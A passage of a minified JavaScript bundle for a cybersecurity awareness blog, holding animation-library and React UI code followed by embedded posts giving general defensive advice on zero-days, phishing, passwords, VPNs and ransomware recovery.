Bf(i){i.finishAnimation(),i.targetDelta=i.relativeTarget=i.target=void 0,i.isProjectionDirty=!0}function n1(i){i.resolveTargetDelta()}function i1(i){i.calcProjection()}function r1(i){i.resetRotation()}function s1(i){i.removeLeadSnapshot()}function Nf(i,t,r){i.translate=Be(t.translate,0,r),i.scale=Be(t.scale,1,r),i.origin=t.origin,i.originPoint=t.originPoint}function Ff(i,t,r,s){i.min=Be(t.min,r.min,s),i.max=Be(t.max,r.max,s)}function o1(i,t,r,s){Ff(i.x,t.x,r.x,s),Ff(i.y,t.y,r.y,s)}function a1(i){return i.animationValues&&i.animationValues.opacityExit!==void 0}const l1={duration:.45,ease:[.4,0,.1,1]},zf=i=>typeof navigator<"u"&&navigator.userAgent.toLowerCase().includes(i),Vf=zf("applewebkit/")&&!zf("chrome/")?Math.round:Ue;function Uf(i){i.min=Vf(i.min),i.max=Vf(i.max)}function c1(i){Uf(i.x),Uf(i.y)}function Vm(i,t,r){return i==="position"||i==="preserve-aspect"&&!Vc(Df(t),Df(r),.2)}const d1=zm({attachResizeListener:(i,t)=>ln(i,"resize",t),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body.scrollLeft,y:document.documentElement.scrollTop||document.body.scrollTop}),checkIsScrollRoot:()=>!0}),kc={current:void 0},Um=zm({measureScroll:i=>({x:i.scrollLeft,y:i.scrollTop}),defaultParent:()=>{if(!kc.current){const i=new d1({});i.mount(window),i.setOptions({layoutScroll:!0}),kc.current=i}return kc.current},resetTransform:(i,t)=>{i.style.transform=t!==void 0?t:"none"},checkIsScrollRoot:i=>window.getComputedStyle(i).position==="fixed"}),u1={pan:{Feature:Ex},drag:{Feature:Cx,ProjectionNode:Um,MeasureLayout:Om}},h1=/var\((--[a-zA-Z0-9-_]+),? ?([a-zA-Z0-9 ()%#.,-]+)?\)/;function p1(i){const t=h1.exec(i);if(!t)return[,];const[,r,s]=t;return[r,s]}function Hc(i,t,r=1){const[s,a]=p1(i);if(!s)return;const c=window.getComputedStyle(t).getPropertyValue(s);if(c){const d=c.trim();return Sm(d)?parseFloat(d):d}else return jc(a)?Hc(a,t,r+1):a}function f1(i,{...t},r){const s=i.current;if(!(s instanceof Element))return{target:t,transitionEnd:r};r&&(r={...r}),i.values.forEach(a=>{const c=a.get();if(!jc(c))return;const d=Hc(c,s);d&&a.set(d)});for(const a in t){const c=t[a];if(!jc(c))continue;const d=Hc(c,s);d&&(t[a]=d,r||(r={}),r[a]===void 0&&(r[a]=c))}return{target:t,transitionEnd:r}}const g1=new Set(["width","height","top","left","right","bottom","x","y","translateX","translateY"]),Wm=i=>g1.has(i),m1=i=>Object.keys(i).some(Wm),Wf=i=>i===gi||i===le,$f=(i,t)=>parseFloat(i.split(", ")[t]),Hf=(i,t)=>(r,{transform:s})=>{if(s==="none"||!s)return 0;const a=s.match(/^matrix3d\((.+)\)$/);if(a)return $f(a[1],t);{const c=s.match(/^matrix\((.+)\)$/);return c?$f(c[1],i):0}},y1=new Set(["x","y","z"]),b1=us.filter(i=>!y1.has(i));function v1(i){const t=[];return b1.forEach(r=>{const s=i.getValue(r);s!==void 0&&(t.push([r,s.get()]),s.set(r.startsWith("scale")?1:0))}),t.length&&i.render(),t}const nr={width:({x:i},{paddingLeft:t="0",paddingRight:r="0"})=>i.max-i.min-parseFloat(t)-parseFloat(r),height:({y:i},{paddingTop:t="0",paddingBottom:r="0"})=>i.max-i.min-parseFloat(t)-parseFloat(r),top:(i,{top:t})=>parseFloat(t),left:(i,{left:t})=>parseFloat(t),bottom:({y:i},{top:t})=>parseFloat(t)+(i.max-i.min),right:({x:i},{left:t})=>parseFloat(t)+(i.max-i.min),x:Hf(4,13),y:Hf(5,14)};nr.translateX=nr.x;nr.translateY=nr.y;const w1=(i,t,r)=>{const s=t.measureViewportBox(),a=t.current,c=getComputedStyle(a),{display:d}=c,h={};d==="none"&&t.setStaticValue("display",i.display||"block"),r.forEach(f=>{h[f]=nr[f](s,c)}),t.render();const p=t.measureViewportBox();return r.forEach(f=>{const m=t.getValue(f);m&&m.jump(h[f]),i[f]=nr[f](p,c)}),i},k1=(i,t,r={},s={})=>{t={...t},s={...s};const a=Object.keys(t).filter(Wm);let c=[],d=!1;const h=[];if(a.forEach(p=>{const f=i.getValue(p);if(!i.hasValue(p))return;let m=r[p],y=Gr(m);const v=t[p];let w;if(Ho(v)){const P=v.length,T=v[0]===null?1:0;m=v[T],y=Gr(m);for(let C=T;C<P&&v[C]!==null;C++)w?yd(Gr(v[C])===w):w=Gr(v[C])}else w=Gr(v);if(y!==w)if(Wf(y)&&Wf(w)){const P=f.get();typeof P=="string"&&f.set(parseFloat(P)),typeof v=="string"?t[p]=parseFloat(v):Array.isArray(v)&&w===le&&(t[p]=v.map(parseFloat))}else y?.transform&&w?.transform&&(m===0||v===0)?m===0?f.set(w.transform(m)):t[p]=y.transform(v):(d||(c=v1(i),d=!0),h.push(p),s[p]=s[p]!==void 0?s[p]:t[p],f.jump(v))}),h.length){const p=h.indexOf("height")>=0?window.pageYOffset:null,f=w1(t,i,h);return c.length&&c.forEach(([m,y])=>{i.getValue(m).set(y)}),i.render(),ta&&p!==null&&window.scrollTo({top:p}),{target:f,transitionEnd:s}}else return{target:t,transitionEnd:s}};function x1(i,t,r,s){return m1(t)?k1(i,t,r,s):{target:t,transitionEnd:s}}const T1=(i,t,r,s)=>{const a=f1(i,t,s);return t=a.target,s=a.transitionEnd,x1(i,t,r,s)},Gc={current:null},$m={current:!1};function S1(){if($m.current=!0,!!ta)if(window.matchMedia){const i=window.matchMedia("(prefers-reduced-motion)"),t=()=>Gc.current=i.matches;i.addListener(t),t()}else Gc.current=!1}function A1(i,t,r){const{willChange:s}=t;for(const a in t){const c=t[a],d=r[a];if(mt(c))i.addValue(a,c),Jo(s)&&s.add(a);else if(mt(d))i.addValue(a,tr(c,{owner:i})),Jo(s)&&s.remove(a);else if(d!==c)if(i.hasValue(a)){const h=i.getValue(a);!h.hasAnimated&&h.set(c)}else{const h=i.getStaticValue(a);i.addValue(a,tr(h!==void 0?h:c,{owner:i}))}}for(const a in r)t[a]===void 0&&i.removeValue(a);return t}const Gf=new WeakMap,Hm=Object.keys(as),C1=Hm.length,qf=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"],E1=ld.length;class P1{constructor({parent:t,props:r,presenceContext:s,reducedMotionConfig:a,visualState:c},d={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.values=new Map,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.scheduleRender=()=>_e.render(this.render,!1,!0);const{latestValues:h,renderState:p}=c;this.latestValues=h,this.baseTarget={...h},this.initialValues=r.initial?{...h}:{},this.renderState=p,this.parent=t,this.props=r,this.presenceContext=s,this.depth=t?t.depth+1:0,this.reducedMotionConfig=a,this.options=d,this.isControllingVariants=ia(r),this.isVariantNode=Ig(r),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(t&&t.current);const{willChange:f,...m}=this.scrapeMotionValuesFromProps(r,{});for(const y in m){const v=m[y];h[y]!==void 0&&mt(v)&&(v.set(h[y],!1),Jo(f)&&f.add(y))}}scrapeMotionValuesFromProps(t,r){return{}}mount(t){this.current=t,Gf.set(t,this),this.projection&&!this.projection.instance&&this.projection.mount(t),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((r,s)=>this.bindToMotionValue(s,r)),$m.current||S1(),this.shouldReduceMotion=this.reducedMotionConfig==="never"?!1:this.reducedMotionConfig==="always"?!0:Gc.current,this.parent&&this.parent.children.add(this),this.update(this.props,this.presenceContext)}unmount(){Gf.delete(this.current),this.projection&&this.projection.unmount(),hn(this.notifyUpdate),hn(this.render),this.valueSubscriptions.forEach(t=>t()),this.removeFromVariantTree&&this.removeFromVariantTree(),this.parent&&this.parent.children.delete(this);for(const t in this.events)this.events[t].clear();for(const t in this.features)this.features[t].unmount();this.current=null}bindToMotionValue(t,r){const s=fi.has(t),a=r.on("change",d=>{this.latestValues[t]=d,this.props.onUpdate&&_e.update(this.notifyUpdate,!1,!0),s&&this.projection&&(this.projection.isTransformDirty=!0)}),c=r.on("renderRequest",this.scheduleRender);this.valueSubscriptions.set(t,()=>{a(),c()})}sortNodePosition(t){return!this.current||!this.sortInstanceNodePosition||this.type!==t.type?0:this.sortInstanceNodePosition(this.current,t.current)}loadFeatures({children:t,...r},s,a,c){let d,h;for(let p=0;p<C1;p++){const f=Hm[p],{isEnabled:m,Feature:y,ProjectionNode:v,MeasureLayout:w}=as[f];v&&(d=v),m(r)&&(!this.features[f]&&y&&(this.features[f]=new y(this)),w&&(h=w))}if((this.type==="html"||this.type==="svg")&&!this.projection&&d){this.projection=new d(this.latestValues,this.parent&&this.parent.projection);const{layoutId:p,layout:f,drag:m,dragConstraints:y,layoutScroll:v,layoutRoot:w}=r;this.projection.setOptions({layoutId:p,layout:f,alwaysMeasureLayout:!!m||y&&Qi(y),visualElement:this,scheduleRender:()=>this.scheduleRender(),animationType:typeof f=="string"?f:"both",initialPromotionConfig:c,layoutScroll:v,layoutRoot:w})}return h}updateFeatures(){for(const t in this.features){const r=this.features[t];r.isMounted?r.update():(r.mount(),r.isMounted=!0)}}triggerBuild(){this.build(this.renderState,this.latestValues,this.options,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):$e()}getStaticValue(t){return this.latestValues[t]}setStaticValue(t,r){this.latestValues[t]=r}makeTargetAnimatable(t,r=!0){return this.makeTargetAnimatableFromInstance(t,this.props,r)}update(t,r){(t.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=t,this.prevPresenceContext=this.presenceContext,this.presenceContext=r;for(let s=0;s<qf.length;s++){const a=qf[s];this.propEventSubscriptions[a]&&(this.propEventSubscriptions[a](),delete this.propEventSubscriptions[a]);const c=t["on"+a];c&&(this.propEventSubscriptions[a]=this.on(a,c))}this.prevMotionValues=A1(this,this.scrapeMotionValuesFromProps(t,this.prevProps),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(t){return this.props.variants?this.props.variants[t]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}getVariantContext(t=!1){if(t)return this.parent?this.parent.getVariantContext():void 0;if(!this.isControllingVariants){const s=this.parent?this.parent.getVariantContext()||{}:{};return this.props.initial!==void 0&&(s.initial=this.props.initial),s}const r={};for(let s=0;s<E1;s++){const a=ld[s],c=this.props[a];(os(c)||c===!1)&&(r[a]=c)}return r}addVariantChild(t){const r=this.getClosestVariantNode();if(r)return r.variantChildren&&r.variantChildren.add(t),()=>r.variantChildren.delete(t)}addValue(t,r){r!==this.values.get(t)&&(this.removeValue(t),this.bindToMotionValue(t,r)),this.values.set(t,r),this.latestValues[t]=r.get()}removeValue(t){this.values.delete(t);const r=this.valueSubscriptions.get(t);r&&(r(),this.valueSubscriptions.delete(t)),delete this.latestValues[t],this.removeValueFromRenderState(t,this.renderState)}hasValue(t){return this.values.has(t)}getValue(t,r){if(this.props.values&&this.props.values[t])return this.props.values[t];let s=this.values.get(t);return s===void 0&&r!==void 0&&(s=tr(r,{owner:this}),this.addValue(t,s)),s}readValue(t){var r;return this.latestValues[t]!==void 0||!this.current?this.latestValues[t]:(r=this.getBaseTargetFromProps(this.props,t))!==null&&r!==void 0?r:this.readValueFromInstance(this.current,t,this.options)}setBaseTarget(t,r){this.baseTarget[t]=r}getBaseTarget(t){var r;const{initial:s}=this.props,a=typeof s=="string"||typeof s=="object"?(r=md(this.props,s))===null||r===void 0?void 0:r[t]:void 0;if(s&&a!==void 0)return a;const c=this.getBaseTargetFromProps(this.props,t);return c!==void 0&&!mt(c)?c:this.initialValues[t]!==void 0&&a===void 0?void 0:this.baseTarget[t]}on(t,r){return this.events[t]||(this.events[t]=new Cd),this.events[t].add(r)}notify(t,...r){this.events[t]&&this.events[t].notify(...r)}}class Gm extends P1{sortInstanceNodePosition(t,r){return t.compareDocumentPosition(r)&2?1:-1}getBaseTargetFromProps(t,r){return t.style?t.style[r]:void 0}removeValueFromRenderState(t,{vars:r,style:s}){delete r[t],delete s[t]}makeTargetAnimatableFromInstance({transition:t,transitionEnd:r,...s},{transformValues:a},c){let d=Hk(s,t||{},this);if(a&&(r&&(r=a(r)),s&&(s=a(s)),d&&(d=a(d))),c){Wk(this,s,d);const h=T1(this,s,d,r);r=h.transitionEnd,s=h.target}return{transition:t,transitionEnd:r,...s}}}function I1(i){return window.getComputedStyle(i)}class _1 extends Gm{constructor(){super(...arguments),this.type="html"}readValueFromInstance(t,r){if(fi.has(r)){const s=kd(r);return s&&s.default||0}else{const s=I1(t),a=(Mg(r)?s.getPropertyValue(r):s[r])||0;return typeof a=="string"?a.trim():a}}measureInstanceViewportBox(t,{transformPagePoint:r}){return Mm(t,r)}build(t,r,s,a){ud(t,r,s,a.transformTemplate)}scrapeMotionValuesFromProps(t,r){return gd(t,r)}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:t}=this.props;mt(t)&&(this.childSubscription=t.on("change",r=>{this.current&&(this.current.textContent=`${r}`)}))}renderInstance(t,r,s,a){Fg(t,r,s,a)}}class R1 extends Gm{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1}getBaseTargetFromProps(t,r){return t[r]}readValueFromInstance(t,r){if(fi.has(r)){const s=kd(r);return s&&s.default||0}return r=zg.has(r)?r:od(r),t.getAttribute(r)}measureInstanceViewportBox(){return $e()}scrapeMotionValuesFromProps(t,r){return Ug(t,r)}build(t,r,s,a){pd(t,r,s,this.isSVGTag,a.transformTemplate)}renderInstance(t,r,s,a){Vg(t,r,s,a)}mount(t){this.isSVGTag=fd(t.tagName),super.mount(t)}}const D1=(i,t)=>dd(i)?new R1(t,{enableHardwareAcceleration:!1}):new _1(t,{enableHardwareAcceleration:!0}),M1={layout:{ProjectionNode:Um,MeasureLayout:Om}},j1={...ox,...C0,...u1,...M1},et=Ow((i,t)=>p0(i,t,j1,D1));function qm(){const i=S.useRef(!1);return sd(()=>(i.current=!0,()=>{i.current=!1}),[]),i}function O1(){const i=qm(),[t,r]=S.useState(0),s=S.useCallback(()=>{i.current&&r(t+1)},[t]);return[S.useCallback(()=>_e.postRender(s),[s]),t]}class L1 extends S.Component{getSnapshotBeforeUpdate(t){const r=this.props.childRef.current;if(r&&t.isPresent&&!this.props.isPresent){const s=this.props.sizeRef.current;s.height=r.offsetHeight||0,s.width=r.offsetWidth||0,s.top=r.offsetTop,s.left=r.offsetLeft}return null}componentDidUpdate(){}render(){return this.props.children}}function B1({children:i,isPresent:t}){const r=S.useId(),s=S.useRef(null),a=S.useRef({width:0,height:0,top:0,left:0});return S.useInsertionEffect(()=>{const{width:c,height:d,top:h,left:p}=a.current;if(t||!s.current||!c||!d)return;s.current.dataset.motionPopId=r;const f=document.createElement("style");return document.head.appendChild(f),f.sheet&&f.sheet.insertRule(`
          [data-motion-pop-id="${r}"] {
            position: absolute !important;
            width: ${c}px !important;
            height: ${d}px !important;
            top: ${h}px !important;
            left: ${p}px !important;
          }
        `),()=>{document.head.removeChild(f)}},[t]),S.createElement(L1,{isPresent:t,childRef:s,sizeRef:a},S.cloneElement(i,{ref:s}))}const xc=({children:i,initial:t,isPresent:r,onExitComplete:s,custom:a,presenceAffectsLayout:c,mode:d})=>{const h=Wg(N1),p=S.useId(),f=S.useMemo(()=>({id:p,initial:t,isPresent:r,custom:a,onExitComplete:m=>{h.set(m,!0);for(const y of h.values())if(!y)return;s&&s()},register:m=>(h.set(m,!1),()=>h.delete(m))}),c?void 0:[r]);return S.useMemo(()=>{h.forEach((m,y)=>h.set(y,!1))},[r]),S.useEffect(()=>{!r&&!h.size&&s&&s()},[r]),d==="popLayout"&&(i=S.createElement(B1,{isPresent:r},i)),S.createElement(ea.Provider,{value:f},i)};function N1(){return new Map}function F1(i){return S.useEffect(()=>()=>i(),[])}const oi=i=>i.key||"";function z1(i,t){i.forEach(r=>{const s=oi(r);t.set(s,r)})}function V1(i){const t=[];return S.Children.forEach(i,r=>{S.isValidElement(r)&&t.push(r)}),t}const U1=({children:i,custom:t,initial:r=!0,onExitComplete:s,exitBeforeEnter:a,presenceAffectsLayout:c=!0,mode:d="sync"})=>{const h=S.useContext(cd).forceRender||O1()[0],p=qm(),f=V1(i);let m=f;const y=S.useRef(new Map).current,v=S.useRef(m),w=S.useRef(new Map).current,P=S.useRef(!0);if(sd(()=>{P.current=!1,z1(f,w),v.current=m}),F1(()=>{P.current=!0,w.clear(),y.clear()}),P.current)return S.createElement(S.Fragment,null,m.map(R=>S.createElement(xc,{key:oi(R),isPresent:!0,initial:r?void 0:!1,presenceAffectsLayout:c,mode:d},R)));m=[...m];const T=v.current.map(oi),C=f.map(oi),L=T.length;for(let R=0;R<L;R++){const M=T[R];C.indexOf(M)===-1&&!y.has(M)&&y.set(M,void 0)}return d==="wait"&&y.size&&(m=[]),y.forEach((R,M)=>{if(C.indexOf(M)!==-1)return;const O=w.get(M);if(!O)return;const W=T.indexOf(M);let J=R;if(!J){const G=()=>{y.delete(M);const X=Array.from(w.keys()).filter(ie=>!C.includes(ie));if(X.forEach(ie=>w.delete(ie)),v.current=f.filter(ie=>{const ge=oi(ie);return ge===M||X.includes(ge)}),!y.size){if(p.current===!1)return;h(),s&&s()}};J=S.createElement(xc,{key:oi(O),isPresent:!1,onExitComplete:G,custom:t,presenceAffectsLayout:c,mode:d},O),y.set(M,J)}m.splice(W,0,J)}),m=m.map(R=>{const M=R.key;return y.has(M)?R:S.createElement(xc,{key:oi(R),isPresent:!0,presenceAffectsLayout:c,mode:d},R)}),S.createElement(S.Fragment,null,y.size?m:m.map(R=>S.cloneElement(R)))},Km=S.createContext(void 0);function W1({children:i,defaultTheme:t="system",storageKey:r="vite-ui-theme",...s}){const[a,c]=S.useState(()=>localStorage.getItem(r)||t);S.useEffect(()=>{const h=window.document.documentElement;if(h.classList.remove("light","dark"),a==="system"){const p=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";h.classList.add(p);return}h.classList.add(a)},[a]);const d={theme:a,setTheme:h=>{localStorage.setItem(r,h),c(h)}};return x.jsx(Km.Provider,{...s,value:d,children:i})}const Vn=()=>{const i=S.useContext(Km);if(i===void 0)throw new Error("useTheme must be used within a ThemeProvider");return i},$1=({currentHash:i})=>{const{theme:t}=Vn(),r="https://ethicalbyte.in/assets/img/logo.png",s="https://ethicalbyte.in/",a=c=>{const d=i===c||c==="#/"&&i==="#";let h="transition-colors flex items-center font-medium px-3 py-2 rounded-md text-sm ";return d?h+=t==="dark"?"bg-primary/20 text-primary":"bg-primary/10 text-primary":h+=t==="dark"?"text-slate-300 hover:text-primary hover:bg-primary/10":"text-foreground hover:text-primary hover:bg-primary/5",h};return x.jsx(et.nav,{initial:{y:-100},animate:{y:0},transition:{type:"spring",stiffness:120,damping:20},className:"sticky top-0 z-50 glassmorphism-nav",children:x.jsxs("div",{className:"container mx-auto px-4 py-3 flex justify-between items-center",children:[x.jsx("a",{href:s,target:"_blank",rel:"noopener noreferrer",className:"flex items-center",children:x.jsx("img",{src:r,alt:"EthicalByte Logo",className:"h-10 md:h-12"})}),x.jsxs("div",{className:"space-x-2 md:space-x-3",children:[x.jsxs("a",{href:"#/",className:a("#/"),children:[x.jsx(ww,{size:18,className:"mr-1.5"}),"Recent"]}),x.jsxs("a",{href:"#/all-blogs",className:a("#/all-blogs"),children:[x.jsx(kg,{size:18,className:"mr-1.5"}),"All Posts"]})]})]})})},H1=()=>{const{theme:i}=Vn(),t=new Date().getFullYear(),r=i==="dark"?"hover:text-primary":"text-muted-foreground hover:text-primary",s=i==="dark"?"text-slate-400":"text-muted-foreground",a=i==="dark"?"bg-slate-900/60":"bg-slate-50",c=i==="dark"?"border-slate-700/60":"border-border";return x.jsx("footer",{className:`${a} border-t ${c} ${s} py-8 mt-12`,children:x.jsxs("div",{className:"container mx-auto px-4 text-center",children:[x.jsxs("div",{className:"flex justify-center space-x-6 mb-4",children:[x.jsxs("a",{href:"https://github.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[x.jsx(gw,{size:22}),x.jsx("span",{className:"sr-only",children:"GitHub"})]}),x.jsxs("a",{href:"https://linkedin.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[x.jsx(bw,{size:22}),x.jsx("span",{className:"sr-only",children:"LinkedIn"})]}),x.jsxs("a",{href:"https://twitter.com",target:"_blank",rel:"noopener noreferrer",className:`${r} transition-colors`,children:[x.jsx(Sw,{size:22}),x.jsx("span",{className:"sr-only",children:"Twitter"})]})]}),x.jsxs("p",{className:"text-sm",children:["© ",t," CyberSec Insights. All rights reserved."]}),x.jsx("p",{className:"text-xs mt-1",children:"Disclaimer: Information on this blog is for educational purposes only."})]})})},G1=({children:i,routeKey:t})=>x.jsxs("div",{className:"flex flex-col min-h-screen bg-background text-foreground",children:[x.jsx($1,{currentHash:t}),x.jsx(et.main,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,y:-20},transition:{duration:.3},className:"flex-grow container mx-auto px-4 py-8",children:i},t),x.jsx(H1,{})]}),Ed=[{id:"zero-day-vulnerabilities-explained",title:"Zero-Day Vulnerabilities: The Unseen Threat",date:"2025-05-23",author:"Alex Cryptos",summary:"Explore what zero-day vulnerabilities are, why they are so dangerous, and how organizations try to mitigate their impact.",tags:["zero-day","vulnerability","exploit","cyber defense"],imageKey:"zeroDayThreat",content:`
          <p>A zero-day vulnerability is a software security flaw that is known to the software vendor but doesn't have a patch in place to fix the flaw. It's called "zero-day" because the vendor has zero days to fix the problem before it potentially becomes known to attackers.</p>
          <h3>Why are Zero-Days Dangerous?</h3>
          <ul>
            <li><strong>No Defense:</strong> Since there's no patch, traditional signature-based antivirus software might not detect attacks exploiting the vulnerability.</li>
            <li><strong>High Value for Attackers:</strong> Zero-day exploits (the code attackers use to take advantage of a zero-day vulnerability) can be sold for high prices on the black market.</li>
            <li><strong>Widespread Impact:</strong> If the vulnerability exists in widely used software, millions of users could be at risk.</li>
          </ul>
          <h3>Mitigation Strategies:</h3>
          <p>While it's impossible to be completely immune to zero-day attacks, organizations and individuals can take steps:</p>
          <ol>
            <li><strong>Patch Management:</strong> Apply security patches promptly when they become available. While this doesn't stop zero-days, it closes known vulnerabilities.</li>
            <li><strong>Behavior-Based Detection:</strong> Security solutions that monitor for suspicious behavior rather than known signatures can sometimes detect zero-day exploits.</li>
            <li><strong>Network Segmentation:</strong> Limiting network access can help contain the damage if a system is compromised.</li>
            <li><strong>Security Awareness:</strong> Educating users about phishing and other attack vectors that might deliver zero-day exploits.</li>
          </ol>
          <p>The fight against zero-day threats is ongoing, requiring vigilance from software vendors, security researchers, and users alike.</p>
        `},{id:"understanding-phishing-attacks",title:"Understanding Phishing Attacks and How to Avoid Them",date:"2025-05-20",author:"Dr. Secure",summary:"Phishing remains one of the most common cyber threats. Learn to identify phishing attempts and protect your personal information.",tags:["phishing","email security","cyber awareness"],imageKey:"phishingConcept",content:`
          <p>Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It happens when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information.</p>
          <h3>Common Types of Phishing:</h3>
          <ul>
            <li><strong>Email Phishing:</strong> The most common type, using emails that appear to be from legitimate sources.</li>
            <li><strong>Spear Phishing:</strong> Targets specific individuals or companies, often with personalized information.</li>
            <li><strong>Whaling:</strong> A type of spear phishing aimed at senior executives.</li>
            <li><strong>Smishing and Vishing:</strong> Phishing attempts made via SMS text messages (Smishing) or voice calls (Vishing).</li>
          </ul>
          <h3>How to Identify Phishing Attempts:</h3>
          <ol>
            <li><strong>Check the Sender's Email Address:</strong> Look for slight misspellings or unusual domain names.</li>
            <li><strong>Beware of Urgent or Threatening Language:</strong> Attackers often try to create a sense of urgency.</li>
            <li><strong>Don't Click Suspicious Links:</strong> Hover over links to see the actual URL before clicking.</li>
            <li><strong>Look for Generic Greetings:</strong> "Dear Customer" instead of your name can be a red flag.</li>
            <li><strong>Verify Requests for Personal Information:</strong> Legitimate organizations rarely ask for sensitive data via email.</li>
          </ol>
          <h3>Protecting Yourself:</h3>
          <p>Enable two-factor authentication (2FA) on all your accounts, use strong, unique passwords, and keep your software updated. Be skeptical of unsolicited communications and always verify before providing information or clicking links.</p>
        `},{id:"importance-of-strong-passwords",title:"The Critical Importance of Strong and Unique Passwords",date:"2025-05-15",author:"Jane Cyber",summary:"Passwords are your first line of defense. Discover why strong, unique passwords are vital and how to manage them effectively.",tags:["passwords","account security","best practices"],imageKey:"passwordSecurity",content:`
          <p>In an era where digital accounts hold vast amounts of personal and financial information, the strength of your passwords cannot be overstated. Weak or reused passwords are a primary target for cybercriminals, leading to identity theft, financial loss, and unauthorized access to sensitive data.</p>
          <h3>What Makes a Strong Password?</h3>
          <ul>
            <li><strong>Length:</strong> At least 12-15 characters. Longer is generally better.</li>
            <li><strong>Complexity:</strong> A mix of uppercase letters, lowercase letters, numbers, and symbols.</li>
            <li><strong>Uniqueness:</strong> A different password for every account.</li>
            <li><strong>Unpredictability:</strong> Avoid common words, phrases, or easily guessable information like birthdays or names.</li>
          </ul>
          <h3>Why Unique Passwords Matter:</h3>
          <p>If one account is compromised and you've reused that password elsewhere, attackers can gain access to all those other accounts. This is known as credential stuffing. Using unique passwords for each service significantly limits the damage if one set of credentials is stolen.</p>
          <h3>Password Management Strategies:</h3>
          <ol>
            <li><strong>Use a Password Manager:</strong> These tools generate and store strong, unique passwords for all your accounts. You only need to remember one master password.</li>
            <li><strong>Enable Two-Factor Authentication (2FA):</strong> Adds an extra layer of security beyond just your password.</li>
            <li><strong>Regularly Update Critical Passwords:</strong> Especially for important accounts like banking and email.</li>
          </ol>
          <p>By prioritizing strong password hygiene, you significantly enhance your digital security posture.</p>
        `},{id:"introduction-to-vpn",title:"What is a VPN and Why Should You Use One?",date:"2025-05-10",author:"Net Guardian",summary:"VPNs are powerful tools for enhancing online privacy and security. Understand the basics of VPNs and their benefits.",tags:["vpn","privacy","online security","encryption"],imageKey:"vpnConcept",content:`
          <p>A Virtual Private Network (VPN) is a service that creates a secure, encrypted connection between your device and the internet. It routes your internet traffic through a server operated by the VPN provider, masking your IP address and encrypting your data.</p>
          <h3>How Does a VPN Work?</h3>
          <p>When you connect to a VPN, it establishes a "tunnel" for your data. All your internet traffic passes through this encrypted tunnel to the VPN server. The VPN server then sends your traffic to the internet. To any website or online service you visit, it appears as if your connection is originating from the VPN server's location, not your actual location.</p>
          <h3>Key Benefits of Using a VPN:</h3>
          <ul>
            <li><strong>Enhanced Privacy:</strong> Hides your real IP address, making it harder for websites, advertisers, and your ISP to track your online activities.</li>
            <li><strong>Improved Security:</strong> Encrypts your internet traffic, protecting your data from hackers, especially on public Wi-Fi networks.</li>
            <li><strong>Access Geo-Restricted Content:</strong> Allows you to bypass geographical restrictions on websites and streaming services by connecting to a server in a different country.</li>
            <li><strong>Secure Remote Access:</strong> Businesses use VPNs to allow employees to securely access company networks from remote locations.</li>
          </ul>
          <h3>Choosing a VPN:</h3>
          <p>When selecting a VPN provider, consider factors like their logging policy (no-logs is best), server locations, connection speeds, security protocols offered, and price. Reputable VPNs are transparent about their practices.</p>
          <p>Using a VPN is a simple yet effective step towards a more private and secure online experience.</p>
        `},{id:"ransomware-defense-strategies",title:"Ransomware: How to Defend and Recover",date:"2025-05-05",author:"Data Sentinel",summary:"Ransomware attacks are on the rise. Learn essential defense mechanisms and steps to take if you become a victim.",tags:["ransomware","data backup","incident response"],imageKey:"ransomwareLock",content:`
          <p>Ransomware is a type of malicious software that encrypts a victim's files, making them inaccessible. Attackers then demand a ransom, typically in cryptocurrency, in exchange for the decryption key.</p>
          <h3>Preventative Measures:</h3>
          <ul>
            <li><strong>Regular Backups:</strong> Maintain regular, offline, and tested backups of critical data. This is the most effective defense.</li>
            <li><strong>Security Software:</strong> Use reputable antivirus and anti-malware software and keep it updated.</li>
            <li><strong>Patch Management:</strong> Keep operating systems and applications patched to prevent exploitation of known vulnerabilities.</li>
            <li><strong>Email Security:</strong> Be cautious of email attachments and links, as these are common ransomware delivery vectors.</li>
            <li><strong>User Training:</strong> Educate users on recognizing and avoiding ransomware threats.</li>
          </ul>
          <h3>If You're Attacked:</h3>
          <ol>
            <li><strong>Isolate the Infected System:</strong> Disconnect it from the network immediately to prevent spread.</li>
            <li><strong>Do Not Pay the Ransom (If Possible):</strong> Paying encourages attackers and doesn't guarantee file recovery. Consult law enforcement.</li>
            <li><strong>Restore from Backups:</strong> If you have clean backups, you can restore your systems without paying.</li>
            <li><strong>Report the Incident:</strong> Notify relevant authorities (e.g., local law enforcement, cybersecurity agencies).</li>
          </ol>
          <p>A proactive approach to cybersecurity, centered around robust backups and user awareness, is key to mitigating the risk of ransomware.</p>
